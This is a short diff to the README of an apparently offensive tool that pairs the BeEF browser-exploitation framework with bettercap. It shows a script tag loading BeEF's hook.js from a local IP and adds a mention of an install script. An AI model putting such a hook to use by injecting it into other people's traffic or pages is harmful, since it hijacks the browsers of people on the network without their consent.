@@ -28,7 +28,7 @@ You will also need an index.html file inside of your /var/www/html folder with a
 `<script src="http://<local ip>:3000/hook.js"></script>`
 
 ## Configurate the script
-- Change the directories in the script to your installation of beEF and bettercap.
+- Change the directories in the script to your installation of beEF and bettercap OR run the install script, it will do everything for you.
 
 ## Running the script
 
